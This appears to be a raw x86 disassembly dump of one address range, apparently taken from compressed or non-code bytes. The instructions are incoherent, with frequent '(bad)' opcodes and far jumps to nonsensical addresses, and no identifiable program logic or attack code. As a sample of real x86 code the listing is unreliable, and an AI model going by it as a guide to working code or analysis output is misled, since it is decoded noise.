  420485:	lds    eax,FWORD PTR [esi+0x785dfd1]
  42048b:	dec    edi
  42048c:	pushf  
  42048d:	or     eax,DWORD PTR [ecx-0x22]
  420490:	(bad)
  420493:	add    al,0x72
  420495:	add    al,0x1d
  420497:	and    BYTE PTR [ebx],bh
  420499:	(bad)  
  42049a:	(bad)  
  42049b:	jl     0x42046e
  42049d:	jecxz  0x42050f
  42049f:	push   esp
  4204a0:	cmp    al,0x68
  4204a2:	xchg   ebx,eax
  4204a3:	jbe    0x42044f
  4204a5:	pop    ecx
  4204a6:	aad    0xa8
  4204a8:	inc    ebx
  4204a9:	push   ds
  4204aa:	nop
  4204ab:	jecxz  0x4204a5
  4204ad:	pusha  
  4204ae:	mov    eax,ds:0x99fdc113
  4204b3:	mov    ebp,0x8e500322
  4204b8:	xor    dx,WORD PTR [ecx-0x60ed2703]
  4204bf:	add    esi,edx
  4204c1:	mov    dh,BYTE PTR [ecx]
  4204c3:	ins    DWORD PTR es:[edi],dx
  4204c4:	and    eax,0x4a70235e
  4204c9:	sbb    BYTE PTR [edx+0x246bf946],dl
  4204cf:	fcomp  DWORD PTR [ebp-0x210a84fa]
  4204d5:	ins    DWORD PTR es:[edi],dx
  4204d6:	scas   al,BYTE PTR es:[edi]
  4204d7:	hlt    
  4204d8:	mov    dl,BYTE PTR [ecx*2+0x8876724]
  4204df:	mov    eax,ds:0xe1430c2e
  4204e4:	inc    edx
  4204e5:	ss sti 
  4204e7:	push   0xee0a516d
  4204ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ed:	add    eax,0x56b7074
  4204f2:	add    al,0x69
  4204f4:	cmp    DWORD PTR [ebx-0x6fd01a9e],0xffffffa2
  4204fb:	dec    eax
  4204fc:	sub    BYTE PTR [ebx],ah
  4204fe:	bound  ebx,QWORD PTR [edx-0xf7d6e75]
  420504:	scas   al,BYTE PTR es:[edi]
  420505:	jbe    0x420494
  420507:	xlat   BYTE PTR ds:[ebx]
  420508:	mov    edi,0x71844603
  42050d:	jae    0x4204c4
  42050f:	xchg   edx,eax
  420510:	stc    
  420511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420512:	hlt    
  420513:	pop    esp
  420514:	and    BYTE PTR [eax-0x7584387a],ah
  42051a:	fdiv   st,st(2)
  42051c:	in     eax,dx
  42051d:	out    dx,eax
  42051e:	jl     0x4204a3
  420520:	mov    eax,ds:0x82549664
  420525:	xchg   edi,eax
  420526:	ret    
  420527:	sub    eax,0xcd31891d
  42052c:	mov    dl,0xc
  42052e:	adc    eax,0x36a5908a
  420534:	xchg   edi,eax
  420535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420536:	aaa    
  420537:	lods   al,BYTE PTR ds:[esi]
  420538:	push   edi
  420539:	or     esi,ebx
  42053b:	mov    cl,0xf8
  42053d:	lahf   
  42053e:	cmp    edi,esi
  420540:	call   0x8a341dd1
  420545:	aas    
  420546:	push   0xffffff8f
  420548:	ret    0x7691
  42054b:	xchg   ecx,eax
  42054c:	push   ds
  42054d:	shl    DWORD PTR [edx-0x57],0xc0
  420551:	cmp    eax,0x44a970bd
  420556:	mov    esp,0x270065b3
  42055b:	cmp    BYTE PTR [esi-0x523a953d],dh
  420561:	adc    DWORD PTR [edi],ecx
  420563:	mov    edi,0xbeb79beb
  420568:	mov    bh,0xc4
  42056a:	pop    esi
  42056b:	outs   dx,BYTE PTR ds:[esi]
  42056c:	adc    cl,BYTE PTR [ebx-0x722d6e0]
  420572:	(bad)  
  420573:	jmp    0x42054e
  420575:	das    
  420576:	test   al,0xab
  420578:	data16 loopne 0x4205b0
  42057b:	cld    
  42057c:	push   cs
  42057d:	ins    DWORD PTR es:[edi],dx
  42057e:	je     0x420522
  420580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420581:	sub    eax,0xd6f6aa23
  420586:	call   0x48cc831e
  42058b:	(bad)  
  42058c:	daa    
  42058d:	push   ds
  42058e:	jmp    edi
  420590:	sbb    eax,0xcf356dfe
  420595:	cmp    al,0x1a
  420597:	adc    al,ch
  420599:	(bad)  
  42059a:	outs   dx,BYTE PTR ds:[esi]
  42059b:	mov    WORD PTR ds:[esi],?
  42059e:	cli    
  42059f:	jge    0x4205e4
  4205a1:	pop    ecx
  4205a2:	pop    edx
  4205a3:	sti    
  4205a4:	retf   0xe8d3
  4205a7:	mov    ebx,0xcac3517a
  4205ac:	mov    dl,0x83
  4205ae:	fmul   QWORD PTR [edx+eax*8+0x58]
  4205b2:	dec    esp
  4205b3:	push   es
  4205b4:	outs   dx,BYTE PTR ds:[esi]
  4205b5:	test   al,0x53
  4205b7:	cdq    
  4205b8:	(bad)  
  4205ba:	pop    ss
  4205bb:	cmc    
  4205bc:	sti    
  4205bd:	mov    ebx,0x91d07e20
  4205c2:	jp     0x42061f
  4205c4:	pop    ss
  4205c5:	sbb    eax,0xdcf672bb
  4205ca:	add    bh,BYTE PTR [di]
  4205cd:	mov    bh,0xd1
  4205cf:	rcl    ecx,cl
  4205d1:	ficomp DWORD PTR [ebx+0x6e]
  4205d4:	and    DWORD PTR [ebp+0x32],ebx
  4205d7:	push   eax
  4205d8:	mov    cl,ch
  4205da:	pop    ebp
  4205db:	xchg   edx,eax
  4205dc:	clc    
  4205dd:	push   ebx
  4205de:	and    DWORD PTR [ebx-0x2a75b2f4],0x4
  4205e5:	je     0x4205e6
  4205e7:	sbb    BYTE PTR [eax+0x24],0x55
  4205eb:	fs xor al,0x64
  4205ee:	or     ecx,DWORD PTR [edx-0x122520c5]
  4205f4:	push   esp
  4205f5:	int    0xb5
  4205f7:	adc    edx,edx
  4205f9:	je     0x420656
  4205fb:	and    DWORD PTR [edx+ecx*8],0xafd6a6fe
  420602:	push   ds
  420603:	push   ebp
  420604:	add    DWORD PTR [ecx],esp
  420606:	ffreep st(4)
  420608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420609:	js     0x4205bd
  42060b:	imul   eax,DWORD PTR [edx+ecx*4],0xffffffca
  42060f:	xor    dh,BYTE PTR ss:[ebp-0x14e1eebf]
  420616:	scas   eax,DWORD PTR es:[edi]
  420617:	adc    al,0x67
  420619:	mov    ch,0x9d
  42061b:	imul   edx,DWORD PTR [ebx+edx*1],0x6c
  42061f:	sbb    DWORD PTR [edi+0x5ac46270],edi
  420625:	pop    ds
  420626:	add    ah,BYTE PTR [ebp+0x707e80b7]
  42062c:	cmp    BYTE PTR [ebx+0x6f],0x76
  420630:	xlat   BYTE PTR ds:[ebx]
  420631:	mov    dl,0x1d
  420633:	cmp    esp,DWORD PTR gs:[edi-0x40]
  420637:	shr    ebx,1
  420639:	mov    esp,0x80bc78d5
  42063e:	repz out 0x6c,al
  420641:	push   es
  420642:	mov    ecx,0x4dae2fb6
  420647:	pushf  
  420648:	mov    dh,0x91
  42064a:	jp     0x420668
  42064c:	jb     0x4205e9
  42064e:	aam    0xa5
  420650:	cwde   
  420651:	jb     0x420680
  420653:	mov    ds:0x73ec96a6,al
  420658:	cs xchg ecx,eax
  42065a:	and    ecx,ebp
  42065c:	add    cl,ch
  42065e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42065f:	ror    DWORD PTR [ecx],1
  420661:	scas   al,BYTE PTR es:[edi]
  420662:	push   es
  420663:	(bad)  
  420664:	fadd   st(3),st
  420666:	aas    
  420667:	adc    edi,eax
  420669:	repnz ins BYTE PTR es:[edi],dx
  42066b:	sub    cl,BYTE PTR [edx+0x59]
  42066e:	xchg   edx,eax
  42066f:	(bad)  
  420670:	xchg   edx,eax
  420671:	jmp    0xea08df6
  420676:	adc    bl,BYTE PTR [ebx]
  420678:	(bad)  
  420679:	fxch   st(7)
  42067b:	dec    ebx
  42067c:	(bad)  
  42067d:	daa    
  42067e:	mov    ebp,0x5e0ffb5a
  420683:	mov    bl,BYTE PTR [esi-0x4abea37b]
  420689:	and    ah,BYTE PTR [ecx+0x58c189f7]
  42068f:	mov    ebp,0x715c02f4
  420694:	enter  0x3ad7,0xf3
  420698:	gs call 0xe311:0xdec13354
  4206a0:	mov    edi,0x69e7030f
  4206a5:	add    eax,0xbf7bb85d
  4206aa:	or     ebx,DWORD PTR [ebx]
  4206ac:	(bad)  
  4206ad:	fcmovu st,st(0)
  4206af:	inc    ebp
  4206b0:	push   esp
  4206b1:	retf   0x70f0
  4206b4:	sar    BYTE PTR ds:0x6cebbb09,1
  4206ba:	jg     0x420714
  4206bc:	imul   BYTE PTR [eax-0x4e8dc9]
  4206c2:	adc    al,0x41
  4206c4:	fisttp DWORD PTR [eax]
  4206c6:	xchg   ebp,eax
  4206c7:	aaa    
  4206c8:	pop    eax
  4206c9:	xor    DWORD PTR [ebx-0x70d428ca],0xffffff93
  4206d0:	pop    edx
  4206d1:	leave  
  4206d2:	addr16 or bl,ch
  4206d5:	jo     0x42065e
  4206d7:	stos   DWORD PTR es:[edi],eax
  4206d8:	lods   eax,DWORD PTR ds:[esi]
  4206d9:	int3   
  4206da:	dec    esp
  4206db:	xor    al,0xb1
  4206dd:	pop    edi
  4206de:	and    al,0xc0
  4206e0:	or     BYTE PTR [eax+0x7b3b5b29],0x56
  4206e7:	into   
  4206e8:	iret   
  4206e9:	and    cl,BYTE PTR [ebp+0x365d01ba]
  4206ef:	ins    DWORD PTR es:[edi],dx
  4206f0:	inc    ecx
  4206f1:	jo     0x420708
  4206f3:	push   eax
  4206f4:	aaa    
  4206f5:	inc    BYTE PTR [esi*2+0x29235837]
  4206fc:	push   0x5a
  4206fe:	mov    esi,0xf96a4749
  420703:	jge    0x4206a6
  420705:	mov    ah,ah
  420707:	and    bl,0xe6
  42070a:	sbb    ah,BYTE PTR [edx-0x453f8752]
  420710:	(bad)  
  420711:	inc    edx
  420712:	test   BYTE PTR [edx],0xb9
  420715:	dec    esi
  420716:	mov    ecx,0x4e65e681
  42071b:	and    BYTE PTR [ebx+0x23],cl
  42071e:	jecxz  0x4206ce
  420720:	push   ebx
  420721:	rol    BYTE PTR [edx],0xe3
  420724:	mov    bh,0x69
  420726:	inc    ebx
  420727:	sbb    DWORD PTR [edx-0x380c6048],eax
  42072d:	push   edi
  42072e:	fwait
  42072f:	mov    bh,0x32
  420731:	cmp    BYTE PTR ds:0xd7d69514,0xa8
  420738:	test   BYTE PTR [eax+esi*2],0x15
  42073c:	mov    eax,0xd2b59a0f
  420741:	rol    BYTE PTR [ebx-0x1d],cl
  420744:	ficomp WORD PTR [eax+0x2a]
  420747:	shl    DWORD PTR es:[eax+edi*8+0x6a3267f0],cl
  42074f:	ins    BYTE PTR es:[edi],dx
  420750:	mov    BYTE PTR [edx],al
  420752:	iret   
  420753:	jo     0x4207ce
  420755:	(bad)  
  420756:	mov    bh,0x96
  420758:	mov    WORD PTR [eax-0x721e9011],?
  42075e:	cmp    edx,DWORD PTR [ebx+eiz*1-0x4a]
  420762:	xor    esi,ebp
  420764:	and    DWORD PTR [edx+0x7c],ebp
  420767:	ins    BYTE PTR es:[edi],dx
  420768:	mov    ecx,0x8b06d80b
  42076d:	jmp    0xb3dc216f
  420772:	add    ebp,edx
  420774:	and    eax,0x9f7e3641
  420779:	fidiv  DWORD PTR [ebx-0x5d]
  42077c:	jmp    0x42078b
  42077e:	pushf  
  42077f:	je     0x4207cf
  420781:	jp     0x4207a2
  420783:	in     al,0xce
  420785:	push   eax
  420786:	push   edi
  420787:	icebp  
  420788:	in     eax,dx
  420789:	jne    0x4207d0
  42078b:	mov    al,ds:0x685cd40c
  420790:	mov    esp,0xb1ef10c0
  420795:	ror    DWORD PTR [ebx+0x12],1
  420798:	ins    BYTE PTR es:[edi],dx
  420799:	shr    DWORD PTR [esi-0xd84699a],1
  42079f:	loope  0x4207b6
  4207a1:	inc    ebp
  4207a2:	fucom  st(4)
  4207a4:	js     0x4207d2
  4207a6:	jmp    0x420791
  4207a8:	fstp   TBYTE PTR [eax]
  4207aa:	outs   dx,DWORD PTR ds:[esi]
  4207ab:	ror    DWORD PTR [eax+edx*4-0x6e875753],cl
  4207b2:	pop    ebp
  4207b3:	lea    esi,[edx-0x64]
  4207b6:	push   esi
  4207b7:	pop    esp
  4207b8:	xchg   edx,eax
  4207b9:	cdq    
  4207ba:	leave  
  4207bb:	jl     0x42077b
  4207bd:	out    0x9c,eax
  4207bf:	out    dx,eax
  4207c0:	inc    esp
  4207c1:	bound  eax,QWORD PTR [eax]
  4207c3:	fbld   TBYTE PTR [ebx+0x550217ee]
  4207c9:	pushf  
  4207ca:	gs popw es
  4207cd:	repz adc eax,0xffe3e335
  4207d3:	in     al,0x7e
  4207d5:	dec    edi
  4207d6:	fiadd  WORD PTR [edx]
  4207d8:	cmp    ebx,DWORD PTR [edx+ebp*4+0x33cebb97]
  4207df:	imul   ecx,ebp,0xffffffa2
  4207e2:	into   
  4207e3:	inc    esp
  4207e4:	and    al,0xbd
  4207e6:	push   es
  4207e7:	dec    esp
  4207e8:	mov    bh,0x7d
  4207ea:	in     eax,dx
  4207eb:	xchg   BYTE PTR [edx],bl
  4207ed:	mov    edx,0x42b1ad9a
  4207f2:	xchg   ecx,eax
  4207f3:	pop    ecx
  4207f4:	arpl   bx,di
  4207f6:	mov    ecx,0x3b1288da
  4207fb:	mov    DWORD PTR [esi+0x43],eax
  4207fe:	test   eax,0x5aa869ce
  420803:	sbb    DWORD PTR [edx+0xc],eax
  420806:	aam    0x9
  420808:	arpl   WORD PTR [edi+0x6e94aa2e],sp
  42080e:	mov    al,0xde
  420810:	xor    eax,0x10094cb4
  420815:	sbb    ecx,DWORD PTR [eax+0x57cd95ba]
  42081b:	sbb    esi,DWORD PTR [esi]
  42081d:	(bad)  
  42081e:	xor    DWORD PTR [ebx],ebp
  420820:	mov    WORD PTR [ebx+0x645ddb61],ds
  420826:	call   0xa02c:0x1cc65455
  42082d:	lea    eax,[esi-0x5f036433]
  420833:	push   ds
  420834:	repz fsub QWORD PTR [ecx-0x63]
  420838:	mov    al,fs:0x22f8a929
  42083e:	inc    edx
  42083f:	imul   eax,DWORD PTR [edx+0x104c95f1],0x21b7e649
  420849:	ins    DWORD PTR es:[edi],dx
  42084a:	jb     0x420820
  42084c:	call   0xb6a5fbf2
  420851:	popa   
  420852:	gs inc esp
  420854:	push   cs
  420855:	add    edi,DWORD PTR ds:0x9611d027
  42085b:	mov    ds:0x8acce5d7,eax
  420860:	mov    esi,0x83e37371
  420865:	test   al,0x9f
  420867:	adc    BYTE PTR ds:0x10792b63,0x7e
  42086e:	shl    BYTE PTR [edx-0x5c],cl
  420871:	mov    cl,0xd4
  420873:	fisttp DWORD PTR [esi+ecx*1+0x51]
  420877:	cmp    al,0x28
  420879:	lahf   
  42087a:	mov    ebp,0xdae3f33c
  42087f:	cmp    eax,ebx
  420881:	mov    BYTE PTR [eax+0x1c7602c3],dl
  420887:	cwde   
  420888:	xchg   BYTE PTR [edi],ch
  42088a:	pop    ss
  42088b:	outs   dx,BYTE PTR ds:[esi]
  42088c:	fldcw  WORD PTR [edx-0x5274a690]
  420892:	ss iret 
  420894:	ret    0xdbeb
  420897:	test   al,0x9
  420899:	or     BYTE PTR [esi],bl
  42089b:	or     al,0xf9
  42089d:	ja     0x42088a
  42089f:	mov    ebx,0x3f841cea
  4208a4:	pusha  
  4208a5:	mov    bh,0xbf
  4208a7:	mov    bl,ah
  4208a9:	xchg   ebx,eax
  4208aa:	scas   al,BYTE PTR es:[edi]
  4208ab:	dec    esp
  4208ac:	dec    edi
  4208ad:	pop    es
  4208ae:	xor    al,0xba
  4208b0:	les    ebx,FWORD PTR [ecx-0x2d]
  4208b3:	in     eax,0x25
  4208b5:	imul   ecx,DWORD PTR [esi],0xffffffa2
  4208b8:	dec    eax
  4208b9:	sbb    BYTE PTR [eax+0x31],dh
  4208bc:	dec    esp
  4208bd:	out    dx,al
  4208be:	or     esi,DWORD PTR [ebx-0x7b]
  4208c1:	fs adc al,0x2e
  4208c4:	xchg   edx,eax
  4208c5:	fnstsw WORD PTR [esp+esi*8-0x4c]
  4208c9:	mov    dh,0x5a
  4208cb:	cmp    BYTE PTR [esi+0x14307046],ah
  4208d1:	inc    esp
  4208d2:	mov    al,BYTE PTR [ebx-0x74]
  4208d5:	cmp    BYTE PTR [eax-0xfabee69],dl
  4208db:	push   ss
  4208dc:	cmp    DWORD PTR [eax+edi*4+0x46bafdf4],edx
  4208e3:	popa   
  4208e4:	cwde   
  4208e5:	jl     0x420965
  4208e7:	jo     0x4208d3
  4208e9:	pushf  
  4208ea:	xchg   ebx,eax
  4208eb:	adc    dh,dl
  4208ed:	mov    dl,0xd8
  4208ef:	mov    ch,0x4e
  4208f1:	xchg   esi,eax
  4208f2:	sbb    eax,0x2d
  4208f5:	xor    BYTE PTR [eax],al
  4208f7:	and    bl,BYTE PTR [ebx-0x20d98fa5]
  4208fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208fe:	in     al,0x71
  420900:	ja     0x4208ea
  420902:	and    DWORD PTR [esi],esi
  420904:	mov    ebp,0x31dbcd01
  420909:	(bad)  
  42090a:	fdivr  st(7),st
  42090c:	cdq    
  42090d:	shr    DWORD PTR [ebx],1
  42090f:	and    BYTE PTR [eax+0x3],bh
  420912:	les    ecx,FWORD PTR [ebx-0x56d95f0c]
  420918:	fstp   TBYTE PTR [esi-0x4c361d9f]
  42091e:	gs pop edx
  420920:	inc    eax
  420921:	enter  0x5049,0xa5
  420925:	les    edx,FWORD PTR [edx-0xa1dc541]
  42092b:	das    
  42092c:	gs imul ebx,ebp,0x2f7008da
  420933:	xchg   DWORD PTR [edx-0x4b],ebp
  420936:	imul   edi,DWORD PTR [edi],0xffffffa0
  420939:	xor    BYTE PTR [eax-0x52],0xf4
  42093d:	cmp    BYTE PTR [ecx-0x59ab1c04],bl
  420943:	js     0x420920
  420945:	fbstp  TBYTE PTR [edi+edi*4]
  420948:	ror    DWORD PTR [edi-0x6871194b],1
  42094e:	rcl    BYTE PTR [esi],1
  420950:	pop    edi
  420951:	dec    ebx
  420952:	xor    DWORD PTR [ebp+0x2ff0d292],esi
  420958:	(bad)  
  420959:	test   eax,0xe6fde7e7
  42095e:	es (bad) 
  420960:	arpl   WORD PTR [edi+0x3f65b3e5],si
  420966:	sahf   
  420967:	ss hlt 
  420969:	fsub   DWORD PTR [edi]
  42096b:	xchg   DWORD PTR [edx+0x6006aa03],eax
  420971:	mov    ecx,0xa228e1b1
  420976:	stos   DWORD PTR es:[edi],eax
  420977:	imul   ecx,DWORD PTR [ebx+0x25],0xdfe241ee
  42097e:	sbb    dh,cl
  420980:	bound  esp,QWORD PTR [esi+0x2fbd2fcb]
  420986:	dec    ebx
  420987:	dec    esp
  420988:	jae    0x4209b0
  42098a:	dec    esp
  42098b:	mov    bh,0xbc
  42098d:	pusha  
  42098e:	data16 (bad) 
  420990:	fistp  QWORD PTR [edi]
  420992:	jbe    0x420973
  420994:	cwde   
  420995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420996:	les    eax,FWORD PTR [esi-0xf]
  420999:	sar    bl,0x7d
  42099c:	(bad)  
  42099e:	push   0xf5d77313
  4209a3:	pop    esi
  4209a4:	jge    0x4209df
  4209a6:	cmp    eax,0xf0da755f
  4209ab:	loope  0x420954
  4209ad:	fwait
  4209ae:	dec    ecx
  4209af:	fisttp DWORD PTR [ebx-0x19]
  4209b2:	or     edi,edx
  4209b4:	mov    ebp,0x6947c1b8
  4209b9:	mov    dl,0xda
  4209bb:	and    DWORD PTR [edx],0x27b0460f
  4209c1:	cmp    BYTE PTR [edx],cl
  4209c3:	bound  ebx,QWORD PTR [edx-0x75b4f76f]
  4209c9:	dec    ebx
  4209ca:	rcr    dh,1
  4209cc:	leave  
  4209cd:	dec    edi
  4209ce:	loop   0x420980
  4209d0:	push   ds
  4209d1:	cmp    DWORD PTR [esi+esi*2],0xe845f9ff
  4209d8:	push   0x71
  4209da:	arpl   dx,di
  4209dc:	out    0xfa,eax
  4209de:	sub    DWORD PTR [ebx],ecx
  4209e0:	mov    cl,0x10
  4209e2:	outs   dx,BYTE PTR ds:[esi]
  4209e3:	shr    DWORD PTR [ebp+0x5f],1
  4209e6:	shl    al,1
  4209e8:	push   ds
  4209e9:	xor    BYTE PTR [edx-0x72],dl
  4209ec:	mov    al,0x4b
  4209ee:	push   0x43
  4209f0:	and    al,0xc0
  4209f2:	push   edx
  4209f3:	lods   al,BYTE PTR ds:[esi]
  4209f4:	mov    cl,0x5d
  4209f6:	popf   
  4209f7:	(bad)  
  4209f9:	scas   al,BYTE PTR es:[edi]
  4209fa:	daa    
  4209fb:	fsub   DWORD PTR [ebp+0xf]
  4209fe:	jbe    0x4209d4
  420a00:	cs sar edx,cl
  420a03:	mov    ch,BYTE PTR [eax+0x3bfd9243]
  420a09:	pop    esp
  420a0a:	push   eax
  420a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a0c:	stos   DWORD PTR es:[edi],eax
  420a0d:	fnstenv [eax-0x20067f5a]
  420a13:	iret   
  420a14:	in     eax,dx
  420a15:	cwde   
  420a16:	imul   eax,DWORD PTR [ecx-0x1b],0x7ba9872
  420a1d:	xchg   ebp,eax
  420a1e:	mov    cl,0xe5
  420a20:	mov    cs,WORD PTR [ecx+edx*4+0x91d0178]
  420a27:	xor    edx,DWORD PTR [ecx+0x1b17d505]
  420a2d:	or     al,0xef
  420a2f:	imul   esp,DWORD PTR [edx],0x4db29c82
  420a35:	repnz mov ds:0xe8b72aab,al
  420a3b:	in     eax,dx
  420a3c:	dec    edi
  420a3d:	push   cs
  420a3e:	or     eax,0x42912ecf
  420a43:	shl    ecx,0xd8
  420a46:	call   0x5e1020aa
  420a4b:	mov    ah,0xcf
  420a4d:	fcmovnb st,st(7)
  420a4f:	dec    edx
  420a50:	xchg   edi,eax
  420a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a52:	imul   BYTE PTR [eax]
  420a54:	xchg   DWORD PTR [eax],edi
  420a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a57:	fdivr  DWORD PTR [ebx+0xe]
  420a5a:	dec    ebp
  420a5b:	into   
  420a5c:	mov    ah,0x96
  420a5e:	out    dx,eax
  420a5f:	or     eax,0xafa0d347
  420a64:	sub    ebx,DWORD PTR [ebx]
  420a66:	and    eax,0x5ba9fafb
  420a6b:	xchg   ecx,eax
  420a6c:	iret   
  420a6d:	(bad)  
  420a6f:	mov    cl,0xfd
  420a71:	jmp    0x2560:0x685b0d82
  420a78:	pusha  
  420a79:	add    DWORD PTR [edx-0x41],ebp
  420a7c:	cmp    al,0x58
  420a7e:	scas   al,BYTE PTR es:[edi]
  420a7f:	ss es gs (bad) 
  420a83:	jmp    0xd0f5:0x7de8a65c
  420a8a:	mov    ebx,0x44ac09d8
  420a8f:	mov    ch,0x1d
  420a91:	mov    eax,0x94ff9416
  420a96:	into   
  420a97:	mov    ah,0x79
  420a99:	or     esi,ebx
  420a9b:	imul   edx,DWORD PTR [eax-0x7e],0xffffffbf
  420a9f:	dec    ecx
  420aa0:	in     eax,dx
  420aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aa2:	mov    eax,ds:0x49d4c80e
  420aa7:	sahf   
  420aa8:	mov    ebp,0xa2746dbc
  420aad:	push   eax
  420aae:	leave  
  420aaf:	xchg   edi,eax
  420ab0:	aad    0x62
  420ab2:	(bad)  
  420ab3:	sub    bl,bl
  420ab5:	xchg   edi,eax
  420ab6:	adc    DWORD PTR [eax],edi
  420ab8:	add    al,0x16
  420aba:	dec    ebp
  420abb:	mov    ds:0x6a805da,eax
  420ac0:	jg     0x420acb
  420ac2:	dec    ebx
  420ac3:	fidiv  DWORD PTR [ebx]
  420ac5:	mov    ebx,DWORD PTR [ecx+ebp*1-0x7a]
  420ac9:	or     BYTE PTR [eax-0x2f],bh
  420acc:	inc    ecx
  420acd:	push   ebx
  420ace:	jmp    0x420ac7
  420ad0:	push   esp
  420ad1:	int3   
  420ad2:	adc    DWORD PTR [esi+0x6d],ecx
  420ad5:	retf   0xe002
  420ad8:	push   ebx
  420ad9:	jne    0xbb655bc6
  420adf:	mov    ds:0xb57c455,eax
  420ae4:	out    0xf0,eax
  420ae6:	dec    ebx
  420ae7:	mov    bl,0x51
  420ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aea:	sub    esi,DWORD PTR [edi-0x16c9fcec]
  420af0:	or     BYTE PTR [edi+0x594a5d9c],cl
  420af6:	xchg   esi,eax
  420af7:	mov    ebx,0x94169dec
  420afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420afd:	iret   
  420afe:	hlt    
  420aff:	sub    edx,ecx
  420b01:	(bad)  
  420b02:	mov    ds:0xaf617eac,eax
  420b07:	pop    ebp
  420b08:	add    eax,0x321e7ead
  420b0d:	adc    al,0xe3
  420b0f:	repz pop eax
  420b11:	add    eax,0xf93250f7
  420b16:	std    
  420b17:	ds stos BYTE PTR es:[edi],al
  420b19:	xchg   BYTE PTR [esi+ecx*4+0x7de2c561],bl
  420b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b21:	mov    esi,0x4c74a6c1
  420b26:	mov    eax,0x76688924
  420b2b:	test   DWORD PTR ds:[esi-0xd],esi
  420b2f:	push   ecx
  420b30:	adc    BYTE PTR [esi-0x423452e9],al
  420b36:	fcmovnb st,st(4)
  420b38:	call   0xc78d:0xdb02ebd9
  420b3f:	fidivr WORD PTR [esi+ebp*4-0x3]
  420b43:	out    0x45,eax
  420b45:	mov    ch,0xe6
  420b47:	loopne 0x420b2b
  420b49:	inc    esp
  420b4a:	xchg   BYTE PTR ss:[esp+eiz*8],dh
  420b4e:	adc    ebp,DWORD PTR [esi+0x7c]
  420b51:	jbe    0x420b80
  420b53:	xlat   BYTE PTR ds:[ebx]
  420b54:	stc    
  420b55:	inc    ebx
  420b56:	xlat   BYTE PTR ds:[ebx]
  420b57:	call   0x3860:0x1e738c69
  420b5e:	adc    al,0x70
  420b60:	pop    ecx
  420b61:	sbb    dl,BYTE PTR [ebx+0x16]
  420b64:	fs es pushf 
  420b67:	stos   DWORD PTR es:[edi],eax
  420b68:	push   esi
  420b69:	and    BYTE PTR [esi+0x72b35e48],al
  420b6f:	mov    bh,0x4c
  420b71:	add    DWORD PTR [edi+ebx*8-0x34],0x2e24544a
  420b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b7a:	dec    eax
  420b7b:	sbb    bl,ch
  420b7d:	(bad)  
  420b7f:	ficom  DWORD PTR [edi-0x10]
  420b82:	stos   BYTE PTR es:[edi],al
  420b83:	push   eax
  420b84:	dec    esp
  420b85:	pop    edi
  420b86:	bound  ebp,QWORD PTR [edi-0x5e2131c5]
  420b8c:	sti    
  420b8d:	mov    ebp,DWORD PTR [ebx]
  420b8f:	lea    esi,[ecx-0xdd4ade5]
  420b95:	mov    bh,0xa6
  420b97:	aam    0x34
  420b99:	push   esi
  420b9a:	out    0x45,al
  420b9c:	jmp    0x7d112631
  420ba1:	ds or  edx,ebp
  420ba4:	scas   eax,DWORD PTR es:[edi]
  420ba5:	inc    eax
  420ba6:	cmp    al,0xf4
  420ba8:	or     BYTE PTR [ecx],ah
  420baa:	cld    
  420bab:	cmp    eax,0xff4c97dd
  420bb0:	ror    BYTE PTR [edx+0x3c03708a],cl
  420bb6:	mov    ds:0x46e51b96,al
  420bbb:	icebp  
  420bbc:	pop    ebx
  420bbd:	pop    es
  420bbe:	ret    0x867c
  420bc1:	loop   0x420b97
  420bc3:	imul   edi,DWORD PTR [edi-0x488410fc],0x4c
  420bca:	leave  
  420bcb:	jecxz  0x420bc5
  420bcd:	mov    edi,0x47232b95
  420bd2:	in     eax,0xa0
  420bd4:	xor    eax,0xcfb281af
  420bd9:	push   ebx
  420bda:	sar    al,cl
  420bdc:	pop    ss
  420bdd:	dec    esi
  420bde:	cld    
  420bdf:	push   0xffffff84
  420be1:	jbe    0x420c61
  420be3:	mov    bh,0x58
  420be5:	out    dx,al
  420be6:	fcom   DWORD PTR [ebx+esi*8-0x47]
  420bea:	std    
  420beb:	push   ss
  420bec:	mov    ch,0xb3
  420bee:	cmp    esp,edx
  420bf0:	sbb    BYTE PTR [ebx-0x29],bl
  420bf3:	xor    ah,al
  420bf5:	xchg   BYTE PTR [ebx+edi*1],bl
  420bf8:	inc    edi
  420bf9:	sbb    al,0xa3
  420bfb:	ins    DWORD PTR es:[edi],dx
  420bfc:	mov    ebx,DWORD PTR [eax]
  420bfe:	mov    ebx,0xacc9634f
  420c03:	pop    esp
  420c04:	pop    eax
  420c05:	push   ss
  420c06:	loop   0x420be0
  420c08:	dec    ecx
  420c09:	dec    edx
  420c0a:	pop    ebp
  420c0b:	mov    al,0x4f
  420c0d:	retf   0x24e1
  420c10:	addr16 and al,0xba
  420c13:	ja     0x420bb0
  420c15:	cli    
  420c16:	pop    ss
  420c17:	leave  
  420c18:	push   0x355ba108
  420c1d:	jp     0x420c3b
  420c1f:	rcl    edx,1
  420c21:	push   ss
  420c22:	and    edx,DWORD PTR [ecx]
  420c24:	sbb    BYTE PTR [edi+0x3e8aea50],ah
  420c2a:	fdivr  QWORD PTR [eax+0x14]
  420c2d:	push   eax
  420c2e:	ds jo  0x420c4d
  420c31:	adc    ebx,DWORD PTR [ebx]
  420c33:	aam    0xf2
  420c35:	xchg   ebx,eax
  420c36:	add    BYTE PTR [esi+0x44adef0b],bh
  420c3c:	test   eax,0x382ff150
  420c41:	in     eax,dx
  420c42:	or     al,0x3c
  420c44:	xchg   esi,eax
  420c45:	cs rcr ah,cl
  420c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c49:	sahf   
